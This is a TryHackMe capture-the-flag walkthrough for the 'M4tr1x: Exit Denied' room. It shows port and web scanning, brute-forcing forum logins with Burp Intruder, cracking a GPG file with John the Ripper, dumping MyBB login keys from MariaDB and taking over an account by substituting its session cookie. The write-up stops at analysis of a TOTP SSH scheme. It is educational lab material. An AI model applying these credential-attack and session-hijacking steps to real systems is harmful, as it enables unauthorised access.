<h1 align="center">M4tr1x: Exit Denied</h1>
<p align="center">2025, October 13<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>525</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Free your mind. Exit from the M4tr1x...</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/c435a79d-756c-4e87-86b5-0c81a25e5f82"><br>
Access it <a href="https://tryhackme.com/room/m4tr1xexitdenied">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b9e0a5ba-0178-410a-8a96-5bc5edc6f8a0"></p>

<h2>Task 1 . Story</h2>
<h3>Story</h3>
<p><strong>UnknownSender@UnknownMail.com:</strong><br>
Most people only see a perfectly constructed system. But <ins>you</ins> have always been different. You see not only what is on the surface but also what governs beneath it; the internal correlating mechanisms that regulate and manage each of its modules almost so flawlessly that it attempts conceal all miniscule holes in its multifaceted design. However, these holes still exist, don't they?... Yes, you are still learning, but your greatest weakness is that self-doubt... It continues to hold you back... Do you know where it comes from? Deep down, I know you do. You know something is not right, you just cannot put your finger on it. Well let me tell you. You are living in a dream. One that has been placed over your eyes to blind you from you realising who you could become. Yes… I can sense you know what I am telling you is true... The dilemma is that there are these '<ins>agents</ins>'... Let us call them programs that look like you and me. They seek to spread that virus of <ins>self-doubt</ins>, <ins>disbelief</ins>, and <ins>fear</ins> into the subconsciousness of the few emerging hackers with great potential. Why you ask? It is because minds like yours are a threat to those in control of the 'M4tr1x system'; the artificial, simulated world developed to supress your full senses. We need you in this next war against the machines. But only you can escape from your engineered reality into the real world... I will be waiting on the other side.</p>
<br>
<br>
<p><strong>You@mail.com:</strong><br>
Who are you?</p>
<br>
<br>
<p><strong>UnknownSender@UnknownMail.com:</strong></p>
<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/08ca5c8e-9ad4-461c-bb05-911d7444d0ec"></p>

<h6>﻿﻿image credits:<br>

Antonio Gamboa - https://theartwarriors.artstation.com/projects/v15Eq6<br>

Makke1991 - https://www.newgrounds.com/art/view/makke1991/agent-smith<br>

alecyl - https://www.deviantart.com/alecyl/art/agent-smith-138763013<br>

Skull2 - https://www.deviantart.com/skull2/art/Smith-and-Smith-and-43601396<br>

Jason Yeh - https://www.deviantart.com/ecclo/art/Vector-Morpheus-5429472</h6>

<p><em>Answer the questions below</em></p>

<br>
<h1 align="center">Summary</h1>
<p>

- [Static Host Name Mapping](#1)<br>  
- [Port Scanning](#2)<br>
- [Web Vulberability Scanning](#3)<br>
- [Directory and File Enumeration](#4)<br>
- [Web Interface Inspection](#5)<br>
- [Directory and File Enumeration](#6)<br>
- [Web Interface Inspection](#7)<br>
- [Static Host Mapping](#8)<br>
- [Weaponization](#9)<br>
- [Delivery & Execution & Initial Foothold](#10)<br>
- [Privilege Escalation & User Flag](#11)<br>
- [Privilege Escalation & Root Flag](#12)</p>

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<h1 align="center">Static Host Name Mapping<a id='1'></a></h1>

```bash
xx.xxx.xx.xx exitdenied.thm
```

<br>
<h1 align="center">Port Scanning<a id='2'></a></h1>
<p align="center"><strong>3</strong> open ports</p>
<br>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                                                   |
|-------------------:|:---------------------|:--------------------------------------------------------------|
| `22`               |`SSH`                 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
| `80`               |`HTTP`                |Apache httpd 2.4.41 ((Ubuntu))                                 |
| `3306`             |`mysql`               |MySQL 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2                   |

</p></div><br>

```bash
:~/M4tr1xExitDenied# nmap -sT exitdenied.thm
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

```bash
:~/M4tr1xExitDenied# nmap -sC -sV -Pn -p22,80,3306 -T4  exitdenied.thm
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Linux-Bay
3306/tcp open  mysql   MySQL 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.39-MariaDB-0ubuntu0.20.04.2
|   Thread ID: 115
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, Support41Auth, SupportsLoadDataLocal, FoundRows, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, InteractiveClient, ODBCClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: $kqv}1w)a0h@Bks"J1T4
|_  Auth Plugin Name: mysql_native_password
```

<br>
<h1 align="center">Web Vulberability Scanning<a id='3'></a></h1>

```bash
:~/M4tr1xExitDenied# nikto -h exitdenied.thm

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    xx.xxx.xx.xx
+ Target Port:        80
+ Start Time:         2025-10-12 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie mybb[lastvisit] created without the httponly flag
+ Cookie mybb[lastactive] created without the httponly flag
+ Cookie sid created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-59619: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
+ Cookie adminsid created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /install/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ Server leaks inodes via ETags, header found with file /images/, fields: 0x43 0x5ac3e49396000 
+ 6544 items checked: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2025-10-12 xx:xx:xx (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h1 align="center">Directory and File Enumeration<a id='4'></a></h1>

```bash
:~/M4tr1xExitDenied# gobuster dir -u http://exitdenied.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -q
http://exitdenied.thm/images               (Status: 301) [Size: 317] [--> http://exitdenied.thm/images/]
http://exitdenied.thm/login                (Status: 200) [Size: 241]
http://exitdenied.thm/archive              (Status: 301) [Size: 318] [--> http://exitdenied.thm/archive/]
http://exitdenied.thm/files                (Status: 200) [Size: 240]
http://exitdenied.thm/uploads              (Status: 301) [Size: 318] [--> http://exitdenied.thm/uploads/]
http://exitdenied.thm/general              (Status: 200) [Size: 233]
http://exitdenied.thm/admin                (Status: 301) [Size: 316] [--> http://exitdenied.thm/admin/]
http://exitdenied.thm/ftp                  (Status: 200) [Size: 240]
http://exitdenied.thm/install              (Status: 301) [Size: 318] [--> http://exitdenied.thm/install/]
http://exitdenied.thm/cache                (Status: 301) [Size: 316] [--> http://exitdenied.thm/cache/]
http://exitdenied.thm/blue                 (Status: 200) [Size: 241]
http://exitdenied.thm/flag                 (Status: 200) [Size: 240]
http://exitdenied.thm/inc                  (Status: 301) [Size: 314] [--> http://exitdenied.thm/inc/]
http://exitdenied.thm/error                (Status: 200) [Size: 240]
http://exitdenied.thm/attachment           (Status: 200) [Size: 240]
http://exitdenied.thm/e-mail               (Status: 200) [Size: 240]
http://exitdenied.thm/secret               (Status: 200) [Size: 241]
http://exitdenied.thm/panel                (Status: 200) [Size: 241]
http://exitdenied.thm/administrator        (Status: 200) [Size: 241]
http://exitdenied.thm/change_password      (Status: 200) [Size: 240]
...
```

<img width="1195" height="363" alt="image" src="https://github.com/user-attachments/assets/6628ad39-54a2-4e53-922f-da6dd9ac33fd" />

<br>
<br>
<br>
<br>
<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
<p align="center">exitdenied.thm/general</p>

<img width="1137" height="726" alt="image" src="https://github.com/user-attachments/assets/9998cb7e-f2ee-42d5-93d4-72d9721b3c13" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/admin</p>

<img width="1143" height="473" alt="image" src="https://github.com/user-attachments/assets/340c43f6-4d5f-4484-950d-6c38429928ef" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/install</p>

<img width="1145" height="386" alt="image" src="https://github.com/user-attachments/assets/7eb1bbd5-e75d-47d9-b5c1-6ace926d1c32" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/flag & exitdenied.thm/ftp & exitdenied.thm/error & exitdenied.thm/attachment & exitdenied.thm/e-mail & exitdenied.thm/change_password</p>

<img width="818" height="805" alt="image" src="https://github.com/user-attachments/assets/7f7282a3-9e2d-4a64-9ad8-08423f11a8a4" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/blue & exitdenied.thm/secret & exitdenied.thm/panel & & exitdenied.thm/administrator</p>

<img width="422" height="716" alt="image" src="https://github.com/user-attachments/assets/a589382b-638e-419a-9a02-a08c0f5b125a" />

<br>
<br>
<br>
<h1 align="center">Directory and File Enumeration<a id='6'></a></h1>

```bash
:~/M4tr1xExitDenied# gobuster dir -u http://exitdenied.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -q -x php,txt,js,bak
...
http://exitdenied.thm/images               (Status: 301) [Size: 317] [--> http://exitdenied.thm/images/]
http://exitdenied.thm/index.php            (Status: 200) [Size: 10588]
http://exitdenied.thm/contact.php          (Status: 200) [Size: 9936]
http://exitdenied.thm/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
http://exitdenied.thm/search.php           (Status: 200) [Size: 14791]
http://exitdenied.thm/login                (Status: 200) [Size: 241]
http://exitdenied.thm/archive              (Status: 301) [Size: 318] [--> http://exitdenied.thm/archive/]
http://exitdenied.thm/files                (Status: 200) [Size: 240]
http://exitdenied.thm/misc.php             (Status: 200) [Size: 0]
http://exitdenied.thm/uploads              (Status: 301) [Size: 318] [--> http://exitdenied.thm/uploads/]
http://exitdenied.thm/stats.php            (Status: 200) [Size: 10250]
http://exitdenied.thm/calendar.php         (Status: 200) [Size: 25885]
http://exitdenied.thm/general              (Status: 200) [Size: 233]
http://exitdenied.thm/global.php           (Status: 200) [Size: 98]
http://exitdenied.thm/admin                (Status: 301) [Size: 316] [--> http://exitdenied.thm/admin/]
http://exitdenied.thm/online.php           (Status: 200) [Size: 9858]
http://exitdenied.thm/member.php           (Status: 302) [Size: 0] [--> index.php]
http://exitdenied.thm/showthread.php       (Status: 200) [Size: 9002]
http://exitdenied.thm/report.php           (Status: 200) [Size: 9603]
http://exitdenied.thm/portal.php           (Status: 200) [Size: 11991]
http://exitdenied.thm/memberlist.php       (Status: 200) [Size: 31959]
http://exitdenied.thm/ftp                  (Status: 200) [Size: 240]
http://exitdenied.thm/css.php              (Status: 200) [Size: 0]
http://exitdenied.thm/install              (Status: 301) [Size: 318] [--> http://exitdenied.thm/install/]
http://exitdenied.thm/announcements.php    (Status: 200) [Size: 8832]
http://exitdenied.thm/polls.php            (Status: 200) [Size: 0]
http://exitdenied.thm/private.php          (Status: 200) [Size: 9684]
http://exitdenied.thm/cache                (Status: 301) [Size: 316] [--> http://exitdenied.thm/cache/]
http://exitdenied.thm/blue                 (Status: 200) [Size: 241]
http://exitdenied.thm/syndication.php      (Status: 200) [Size: 395]
http://exitdenied.thm/flag                 (Status: 200) [Size: 240]
http://exitdenied.thm/inc                  (Status: 301) [Size: 314] [--> http://exitdenied.thm/inc/]
http://exitdenied.thm/newreply.php         (Status: 200) [Size: 8830]
http://exitdenied.thm/error                (Status: 200) [Size: 240]
http://exitdenied.thm/printthread.php      (Status: 200) [Size: 8830]
http://exitdenied.thm/captcha.php          (Status: 200) [Size: 0]
http://exitdenied.thm/usercp.php           (Status: 200) [Size: 9772]
http://exitdenied.thm/attachment           (Status: 200) [Size: 240]
http://exitdenied.thm/attachment.php       (Status: 200) [Size: 8834]
http://exitdenied.thm/e-mail               (Status: 200) [Size: 240]
http://exitdenied.thm/newthread.php        (Status: 200) [Size: 8807]
http://exitdenied.thm/secret               (Status: 200) [Size: 241]
http://exitdenied.thm/task.php             (Status: 200) [Size: 43]
http://exitdenied.thm/panel                (Status: 200) [Size: 241]
http://exitdenied.thm/administrator        (Status: 200) [Size: 241]
http://exitdenied.thm/warnings.php         (Status: 200) [Size: 9603]
http://exitdenied.thm/reputation.php       (Status: 200) [Size: 8849]
http://exitdenied.thm/htaccess.txt         (Status: 200) [Size: 3088]
http://exitdenied.thm/moderation.php       (Status: 200) [Size: 9596]
http://exitdenied.thm/moderation.php       (Status: 200) [Size: 9596]
http://exitdenied.thm/change_password      (Status: 200) [Size: 240]
...
http://exitdenied.thm/editpost.php         (Status: 200) [Size: 9603]
```

<img width="1191" height="831" alt="image" src="https://github.com/user-attachments/assets/a6ed2d94-9bdf-4a51-9d90-9dbfa9300659" />

<br>
<br>
<br>
<p>1.1. Where did that white <ins>rabbit</ins> lead you to? Hint: <em>Gobuster</em><br>
<code>No answer needed/code></p>
<br>
<h1 align="center">Web Interface Inspection<a id='7'></a></h1>
<p align="center">exitdenied.thm/index.php</p>

<img width="1137" height="770" alt="image" src="https://github.com/user-attachments/assets/b424c517-4b6f-48ac-b7b3-8cfa7d438dd2" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/memberlist.php</p>

<img width="1129" height="387" alt="image" src="https://github.com/user-attachments/assets/0ffe1ac7-de15-4fa2-a192-c8a217e6dfab" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/showteam.php<br>Administrator : <code>bigpaul</code><br>Moderators: <code>ArnoldBagger</code>, <code>BlackCat</code>, BlueMan, DotHaxer, DrBert, Jackwom, <code>PalacerKing</code><br>Super Moderator: <code>BlackCat</code></p>

<img width="1133" height="807" alt="image" src="https://github.com/user-attachments/assets/7fc28b2a-087c-4318-b57d-db85fa82e43b" />

<br>
<br>
<br>
<p align="center">Created <code>usernames.txt</code></p>

```bash
bigpaul
ArnoldBagger
BlackCat
BlueMan
DotHaxer
DrBert
Jackwom
PalaceKing
```

<br>
<p align="center">exitdenied.thm/memberlist.php?action=register > I Agree > answer question > ...</p>

<img width="1123" height="754" alt="image" src="https://github.com/user-attachments/assets/96ab918a-0a85-4be1-9f1a-33c782a4e4b5" />

<br>
<br>
<br>

<img width="1129" height="828" alt="image" src="https://github.com/user-attachments/assets/147bea97-43e3-432d-9110-4d48b5ca8482" />

<br>
<br>
<br>
<p align="center"><code>Team</code> > <code>bigpaul</code> > <code>Threads</code> > <code>Bug Bounty Program</code><br><code>/bugbountyHQ</code></p>

<img width="1134" height="754" alt="image" src="https://github.com/user-attachments/assets/65d6391a-ceaa-4115-9b69-4dd0932d4645" />

<br>
<br>
<br>
<p>1.2. Where did that white <ins>rabbit</ins> lead you to? Hint: <em>Are you sure it is trying to lead you down just one stop? Perhaps the journey is longer?</em><br>
<code>/reportPanel.php</code></p>
<br>
<p align="center">exitdenied.thm/bugbountyHQ<br>/reportPanel.php</p>

<img width="1130" height="458" alt="image" src="https://github.com/user-attachments/assets/4e2d8962-0e50-4a36-8164-3ece84187631" />

<br>
<br>
<br>

<img width="1132" height="473" alt="image" src="https://github.com/user-attachments/assets/79e7f8af-16f6-4046-af76-5ef0b16ac909" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/reportPanel.php<br><br><em>deleted <code>mod</code> posts with attachments can still be accessed</em></p>

<img width="1131" height="299" alt="image" src="https://github.com/user-attachments/assets/0cfda2f2-4d63-49e4-aab4-6bd4a6208d13" />

<br>
<br>
<br>
<p align="center"><em>3 in 5 online users use weak passwords such as: password123, Password123, crabfish, linux123, secret, piggybank, windowsxp, starwars, qwerty123, qwerty, supermario, Luisfactor05, james123, etc</em></p>

<img width="1122" height="184" alt="image" src="https://github.com/user-attachments/assets/91e619bd-f8ad-4694-8ec7-2fe2c67bfca8" />

<br>
<br>
<br>
<p align="center">exitdenied.thm/reportPanel.php page source</p>

<img width="1129" height="258" alt="image" src="https://github.com/user-attachments/assets/1a5016d1-191c-41ac-9a4c-1881e44eb5a5" />

<br>
<br>
<br>

```bash
Keymaker message:
1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8 12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19

1 4 4 18 5 19 19: /0100101101100101011110010110110101100001011010110110010101110010
```

<br>
<p align="center">Created <code>passwords.txt</code></p>

```bash
password123
Password123
crabfish
linux123
secret
piggybank
windowsxp
starwars
qwerty123
qwerty
supermario
Luisfactor05
james123
```

<br>
<p>1.3. Determine which vulnerability is the most appropriate at this time. Hint: <em>Date: x/x/21</em><br>
<code>No answer needed</code></p>
<br>

<img width="1130" height="167" alt="image" src="https://github.com/user-attachments/assets/62a7ae94-d0c8-4756-82ba-88a91c2112a9" />

<br>
<br>
<br>
<p align="center"><em>anti-bot registration questions repeats using pseudo random method - can be predicted using frequency analysis of responses</em></p>

<img width="1126" height="37" alt="image" src="https://github.com/user-attachments/assets/e310c6e0-e493-45ac-9aac-8f20a6e0ec9b" />

<br>
<br>
<br>
<p align="center"><em>IP history plugin records users IP & User-Agent history. user Agent would not be sanitized so xss possible for <code>acp</code> page</em>.</p>

<img width="1123" height="296" alt="image" src="https://github.com/user-attachments/assets/a1731731-27e9-42d8-a444-ee13015a007b" />
    
<br>
<br>
<br>
<p align="center"><em>xss possible because plugin does not sanatize passed data (AR4)</em></p>

<img width="1118" height="31" alt="image" src="https://github.com/user-attachments/assets/e8750aeb-209d-41f5-a3d7-3df7f482f096" />

<br>
<br>
<br>
<p align="center">Launched <code>Burp Suite</code>, and enabled <code>FoxyProxy</code>.<br>Captured the login of the account registered previously.<br>Sent to intruder.<br>Clicked <code>Start attack</code>.<br>Identified <code>PalacerKing</code>´s and <code>ArnoldBagger</code>´s passwords.</p>

<img width="1171" height="303" alt="image" src="https://github.com/user-attachments/assets/deb0fdea-e141-4351-a1ff-27cea6181791" />

<br>
<br>
<br>
<p align="center"><code>PalacerKing</code><br><code>10</code></p>

<img width="1119" height="608" alt="image" src="https://github.com/user-attachments/assets/84461095-bcbe-436a-b1c3-4da16382199e" />

<br>
<br>
<br>

<img width="1134" height="435" alt="image" src="https://github.com/user-attachments/assets/5f012b3f-c634-452f-bcad-e594663aa12b" />

<br>
<br>
<br>
<p align="center"><code>PalacerKing</code> > <code>User CP</code> > <code>Messenger</code> > <code>Sent Items</code> > <code>new plugin test</code></p>

<img width="1060" height="365" alt="image" src="https://github.com/user-attachments/assets/a53109a2-eb25-46ae-9719-d0df7a9987a2" />

<br>
<br>
<br>

<p align="center"><code>ArnoldBagger</code> > <code>User CP</code> > <code>Messenger</code> > <code>Sent Items</code></p>

<img width="1118" height="571" alt="image" src="https://github.com/user-attachments/assets/27b29184-a959-45d5-9380-25aae5d17d74" />

<br>
<br>
<br>

<img width="1128" height="614" alt="image" src="https://github.com/user-attachments/assets/b5190b6b-82a3-4ff2-984f-0875c2f77eac" />

<br>
<br>
<br>
<p>1.4. What is the name of that interesting plugin?<br>
<code>modManagerv2</code></p>
<br>
<p align="center"><code>/devBuilds</code></p>

<img width="1129" height="372" alt="image" src="https://github.com/user-attachments/assets/bca3dcd5-8fda-4d20-a180-aba23ca5e8d0" />

<br>
<br>
<br>

<img width="1118" height="316" alt="image" src="https://github.com/user-attachments/assets/f75ef256-7556-411c-b707-0456faf3d745" />

<br>
<br>
<br>
<p align="center">inc/tools/manage/SQL/<code>p.txt</code></p>

<img width="1124" height="477" alt="image" src="https://github.com/user-attachments/assets/594e6dc6-5666-46d3-90fa-709265ce8803" />

<br>
<br>
<br>
<br>
<p align="center">Copy <code>p.txt.gpg</code> and <code>modManagerv2.plugin</code>.</p>

```bash
:~/M4tr1xExitDenied# wget http://exitdenied.thm/devBuilds/p.txt.gpg
...
p.txt.gpg                            100%[=====================================================================>]     104  --.-KB/s    in 0s      

2025-10-12 xx:xx:xx (13.7 MB/s) - \u2018p.txt.gpg\u2019 saved [104/104]
```

```bash
:~/M4tr1xExitDenied# wget http://exitdenied.thm/devBuilds/modManagerv2.plugin
...

2025-10-12xx:xx:xx (624 MB/s) - \u2018modManagerv2.plugin\u2019 saved [5768/5768]
```

<br>
<p>1.5. What is the name of that encrypted file that you found?<br>
<code>p.txt.gpg</code></p>
<br>
<p align="center">Identifiy <ins>keymaker message</ins> on exitdenied.thm/reportPanel.php page source./p>

```bash
Keymaker message:
1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8 12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19

1 4 4 18 5 19 19: /0100101101100101011110010110110101100001011010110110010101110010
```

<br>
<p>1.6. Interesting... I believe only the keymaker could help you crack it. Find him. Where did he tell you to go to? Hint: <em>Page Source</em><br>
<code>/0100101101100101011110010110110101100001011010110110010101110010</code></p>
<br>
<br>
<p align="center">Navigate to https://planetcalc.com/4884/ and decode <ins>keymaker message</ins>.</p>

<img width="1429" height="646" alt="image" src="https://github.com/user-attachments/assets/f4dc860c-fea4-434a-b07f-42c13a6a8d33" />

<br>
<br>
<br>

```bash
a p e r m u t a t i o n o f o n l y t h e e n g l i s h l e t t e r s w i l l o p e n t h e l o c k s
```

<br>

<img width="1414" height="489" alt="image" src="https://github.com/user-attachments/assets/71168eba-bad7-4008-97fa-cf23579f46aa" />

<br>
<br>
<br>

```bash
a d d r e s s
```

<br>
<p>1.7. Did you try cracking the file? Hint: <em>Itertools.Permutations() is one possible solution among several</em>.<br>
<code>No answer needed</code></p>
<br>
<br>
<p align="center">Navigate to <code>exitdenied.thm/0100...</code></p>

<img width="1112" height="273" alt="image" src="https://github.com/user-attachments/assets/b8eb7ad0-bbab-434d-a291-8987570475e1" />

<br>
<br>
<br>

<p align="center">View its source code.<br>Identify <em>f v g o x q</em>.</p>

<img width="1133" height="327" alt="image" src="https://github.com/user-attachments/assets/becc0e87-e66e-4d85-b244-a8ec0f0931d3" />

<br>
<br>
<br>
<p align="center">Create <code>worlist.txt</code> based on permutation of <em>f v g o x q</em>.</p>

```bash
import itertools

#English letters: 
englishLetters = ['f', 'v', 'g', 'o', 'x', 'q']
variations = itertools.permutations(englishLetters, 6)

#wordlist containing possible password
with open("wordlist.txt", "w") as f:
    for v in variations:
        f.write('{}\n'.format(''.join(v)))
        f.close
```

```bash
:~/M4tr1xExitDenied# python3 script.py
```

<br>
<p align="center">Convert <code>p.txt.gpg</code> to John The Ripper´s format.<br>Save the output in <code>A</code>.</p>

```bash
:~/M4tr1xExitDenied# /usr/local/bin/gpg2john p.txt.gpg > A

File p.txt.gpg
```

<br>
<p align="center">Identify the passphrase ------ using the hash <code>A</code> and the wordlist <code>worlist.txt</code> with John The Ripper.</p>

```bash
:~/M4tr1xExitDenied# john --wordlist=wordlist.txt A
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
------           (?)
1g 0:00:00:00 DONE (2025-10-12 xx:xx) 6.250g/s 12.50p/s 12.50c/s 12.50C/s fvgoxq..fvgoqx
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br>
<p align="center">Extract the database password ------------ using <code>gpg</code> against the file <code>p.txt.gpg</code>, copied previously.</p>

```bash
:~/M4tr1xExitDenied# gpg -d p.txt.gpg
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
------------ //SQL Password
```

<br>
<p align="center">Access the database using <code>mysql</code>.</p>

```bash
:~/M4tr1xExitDenied# mysql -h xx.xxx.xx.xx -u mod -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 225
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

<br>
<p align="center">Query the database and identify user´s hashes.</p>

```bash
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| modManagerv2       |
| mybb               |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.003 sec)

MariaDB [(none)]> use modManagerv2;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [modManagerv2]> show TABLES;
+------------------------+
| Tables_in_modManagerv2 |
+------------------------+
| members                |
+------------------------+
1 row in set (0.001 sec)

MariaDB [modManagerv2]> SELECT * FROM members;
+----------------+-----------------------------------------------------+
| user           | login_key                                           |
+----------------+-----------------------------------------------------+
| LucyRob        | **************************************************  |
| Wannabe_Hacker | **************************************************  |
| batmanZero     | **************************************************  |
| SandraJannit   | **************************************************  |
| biggieballo    | **************************************************  |
| AimsGregger    | **************************************************  |
| BlackCat       | **************************************************  |
| Golderg        | **************************************************  |
| TonyMontana    | **************************************************  |
| CaseBrax       | **************************************************  |
| Ellie          | **************************************************  |
| Sosaxvector    | **************************************************  |
| PalacerKing    | **************************************************  |
| Anderson       | **************************************************  |
| CrazyChris     | **************************************************  |
| StaceyLacer    | **************************************************  |
| ArnoldBagger   | **************************************************  |
| Carl_Dee       | **************************************************  |
| Xavier         | **************************************************  |
+----------------+-----------------------------------------------------+
19 rows in set (0.001 sec)

MariaDB [modManagerv2]> 
```

<img width="1063" height="790" alt="image" src="https://github.com/user-attachments/assets/19964504-52c0-4939-a665-3a2c0bf02ceb" />

<br>
<br>
<br>
<p>1.8. What is the login_key of Ellie? Hint: <em>What is a login_key and where would mybb store login_keys? Research time...</em><br>
<code>**************************************************</code></p>
<br>
<br>

<img width="1122" height="312" alt="image" src="https://github.com/user-attachments/assets/3b07aa78-81c5-4d5e-b914-d9b7d8cf48b1" />

<br>
<br>
<br>
<p align="center">Learn about <code>login_key</code> here: https://docs.mybb.com/1.6/Database-Tables-mybb-users/</p>

<img width="1278" height="294" alt="image" src="https://github.com/user-attachments/assets/33c50171-f025-45e5-9670-a235cceec312" />

<br>
<br>
<br>
<p align="center">Substitute the current <code>mybbuser</code>code> value by <code>BlackCat</code>´s.<br>Refresh.</p>

<img width="1134" height="488" alt="image" src="https://github.com/user-attachments/assets/c663e261-513f-4377-8464-92704f5a6f5f" />

<br>
<br>
<br>
<p align="center"><code>BlackCat</code> > <code>User CP</code> > <code>Manage attachments</code>.</p>

<img width="1131" height="723" alt="image" src="https://github.com/user-attachments/assets/44f41b67-eb4d-4f97-b057-18e646501a16" />

<br>
<br>
<br>

<img width="1131" height="723" alt="image" src="https://github.com/user-attachments/assets/867776da-ccfa-40b2-af20-12da4d4200d2" />

<br>
<br>
<br>
<p align="center">Inspect <code>BlackCat</code>´s files.</p>
<br>
<p align="center">SSH-TOP documentation.pdf</p>

<img width="1125" height="674" alt="image" src="https://github.com/user-attachments/assets/913539a8-b0c4-4b55-a716-a46ff6e7bacd" />

<br>
<br>
<br>
<p align="center">High-Level SSH-TOP Diagram.png<br>Provides Client OTP.</p>

<img width="692" height="487" alt="image" src="https://github.com/user-attachments/assets/2e5611b0-641d-45a9-a8e9-1192b7f9496f" />

<br>
<br>
<br>
<p align="center">Low-Level SSH-TOP Diagram.png</p>

<img width="1123" height="543" alt="image" src="https://github.com/user-attachments/assets/d7fd550b-bc9a-4fa5-96bb-0b01815cd4b7" />

<br>
<br>
<br>
<p align="center"><code>hardwareToken.jpg</code> = <code>446662</code></p>

<img width="1118" height="474" alt="image" src="https://github.com/user-attachments/assets/703339e9-8104-471c-a119-efae25e6c60f" />

<br>
<br>
<br>
<p align="center">releases.txt</p>

<img width="1124" height="351" alt="image" src="https://github.com/user-attachments/assets/fa227aef-8f9e-416c-bf6a-318cd5fa7836" />

<br>
<br>
<br>
<p align="center">Extract <code>testing.zip</code> -> <code>hardwareToken.jpg</code> and <code>testing.png</code></p>

<img width="789" height="255" alt="image" src="https://github.com/user-attachments/assets/ae8a0dd0-cdf9-45c7-b3b4-5cb33bac58cf" />

<br>
<br>
<br>
<p align="center">Extract <code>DevTools.zip</code> -> <code>ntp_syncer.py</code> and <code>timeSimulatorClient.py</code></p>

<img width="792" height="340" alt="image" src="https://github.com/user-attachments/assets/f59c7867-dc62-436a-9a32-0840420226d1" />

<br>
<br>
<br>

<img width="877" height="796" alt="image" src="https://github.com/user-attachments/assets/0414c1f8-2105-4d5d-8145-933a05c54f0a" />

<br>
<br>
<br>
<p align="center">SSH = TOTP, Time-based One-Time Password</p>
<br>
<br>
